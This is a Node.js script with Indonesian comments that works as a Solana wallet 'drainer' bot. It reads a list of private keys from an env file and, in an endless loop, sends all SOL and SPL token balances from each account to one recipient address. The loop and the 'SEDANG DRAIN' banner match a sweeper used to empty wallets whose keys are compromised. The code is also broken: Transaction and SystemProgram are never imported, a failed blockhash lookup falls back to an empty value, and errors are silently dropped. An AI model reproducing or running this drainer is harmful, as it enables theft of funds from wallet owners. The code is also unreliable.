const { Connection, Keypair, PublicKey } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');
const readlineSync = require('readline-sync');
const bs58 = require('bs58');
require('dotenv').config({ path: './data.env' });

// Pastikan PRIVATE_KEYS dan RECIPIENT_ADDRESS ada di file .env
if (!process.env.PRIVATE_KEYS || !process.env.RECIPIENT_ADDRESS) {
  process.exit(1);
}

// Meminta pengguna memilih jaringan
console.log("------");
console.log("Pilih jaringan:");
console.log("0 - Devnet");
console.log("1 - Mainnet");
console.log("------");

const networkChoice = readlineSync.question("Masukkan pilihan (0 atau 1): ");

let rpcUrl;
if (networkChoice === '0') {
  rpcUrl = 'https://api.devnet.solana.com';  // Devnet RPC URL
} else if (networkChoice === '1') {
  rpcUrl = 'https://api.mainnet-beta.solana.com';  // Mainnet RPC URL
} else {
  console.log("------\nPilihan tidak valid. Silakan pilih 0 untuk Devnet atau 1 untuk Mainnet.\n------");
  process.exit(1);
}

// Setup koneksi berdasarkan pilihan jaringan
const connection = new Connection(rpcUrl, 'confirmed');

// Fungsi untuk mendapatkan saldo akun (baik SOL maupun token SPL)
async function getBalance(account) {
  try {
    const balance = await connection.getBalance(account.publicKey);
    return balance;
  } catch (error) {
    return 0;  // Kembali 0 jika gagal
  }
}

// Fungsi untuk mengirim SOL ke penerima
async function sendSOL(senderAccount, recipientPublicKey, amount) {
  try {
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: senderAccount.publicKey,
        toPubkey: recipientPublicKey,
        lamports: amount,
      })
    );

    let recentBlockhash;
    try {
      recentBlockhash = await connection.getRecentBlockhash();
    } catch (error) {
      recentBlockhash = { blockhash: '' }; // Menggunakan blockhash kosong
    }

    transaction.recentBlockhash = recentBlockhash.blockhash;
    transaction.feePayer = senderAccount.publicKey;

    const signature = await connection.sendTransaction(transaction, [senderAccount]);
    await connection.confirmTransaction(signature);
    return signature;
  } catch (error) {
    console.log('------\nSendTransactionError: Gagal mengirim SOL\n------');
    return null;
  }
}

// Fungsi untuk mengirim Token SPL
async function sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amount) {
  try {
    const senderTokenAddress = await getAssociatedTokenAddress(
      mintAddress, 
      senderAccount.publicKey
    );

    const recipientTokenAddress = await getAssociatedTokenAddress(
      mintAddress, 
      recipientPublicKey
    );

    const transaction = new Transaction().add(
      createTransferInstruction(
        senderTokenAddress, 
        recipientTokenAddress, 
        senderAccount.publicKey, 
        amount, 
        []
      )
    );

    const signature = await connection.sendTransaction(transaction, [senderAccount]);
    await connection.confirmTransaction(signature);
    return signature;
  } catch (error) {
    console.log('------\nSendTransactionError: Gagal mengirim Token SPL\n------');
    return null;
  }
}

// Fungsi untuk mendapatkan semua token SPL yang dimiliki oleh akun
async function getSPLTokens(account) {
  const tokens = [];
  try {
    const programId = new PublicKey("TokenkegQfeZyiNwAJbNQAWtDq55RSrk1r6B1V6iowdWcxp");

    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(account.publicKey, {
      programId: programId,  // Program ID untuk SPL Token
    });

    if (tokenAccounts.value.length === 0) {
      console.log('------\nTidak ada token SPL yang ditemukan di akun pengirim.\n------');
      return tokens;
    }

    for (let { pubkey, account } of tokenAccounts.value) {
      const mintAddress = account.data.parsed.info.mint;
      const tokenAmount = account.data.parsed.info.tokenAmount.amount;
      tokens.push({ mintAddress, amount: tokenAmount, pubkey });
      console.log(`------\nToken SPL ditemukan: Mint Address: ${mintAddress}, Saldo: ${tokenAmount}\n------`);
    }
  } catch (error) {
    console.log("------\nError mendapatkan daftar token SPL:", error.message, "\n------");
  }

  return tokens;
}

// Fungsi untuk memproses akun dan mengirimkan SOL + SPL Token
async function processAccount(senderAccount, recipientPublicKey) {
  const balance = await getBalance(senderAccount);

  const feeBufferLamports = 5000;  // Biaya minimum dalam lamports
  const solAmountToSend = balance - feeBufferLamports;

  if (solAmountToSend > 0) {
    const solResponse = await sendSOL(senderAccount, recipientPublicKey, solAmountToSend);
  } else {
    const solResponse = await sendSOL(senderAccount, recipientPublicKey, balance); 
  }

  // Mengirimkan semua token SPL yang ada di akun
  const splTokens = await getSPLTokens(senderAccount);
  if (splTokens.length > 0) {
    for (let { mintAddress, amount } of splTokens) {
      const splResponse = await sendSPLToken(senderAccount, recipientPublicKey, mintAddress, amount);
    }
  }
}

// Fungsi untuk menampilkan loading screen dan delay 5 detik
async function showLoadingScreen() {
  console.log("------\nPONAKANJIBRIL SEDANG DRAIN...");
  await sleep(1000);
  console.log("------\nLoading selesai.\n------");
}

// Fungsi utama untuk menjalankan bot
async function startBot() {
  await showLoadingScreen();

  const privateKeysBase58 = process.env.PRIVATE_KEYS.split(',');
  const recipientAddress = process.env.RECIPIENT_ADDRESS;

  const senderAccounts = privateKeysBase58.map(privateKeyBase58 => {
    const privateKeyBytes = bs58.decode(privateKeyBase58);
    if (privateKeyBytes.length !== 64) {
      return null;
    }
    return Keypair.fromSecretKey(privateKeyBytes);
  }).filter(Boolean);

  let recipientPublicKey;
  try {
    recipientPublicKey = new PublicKey(recipientAddress);
  } catch (error) {
    return; 
  }

  for (let senderAccount of senderAccounts) {
    await processAccount(senderAccount, recipientPublicKey);
  }

  await sleep(5000);
  startBot();
}

// Fungsi tidur untuk menunda eksekusi
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Mulai bot
startBot();
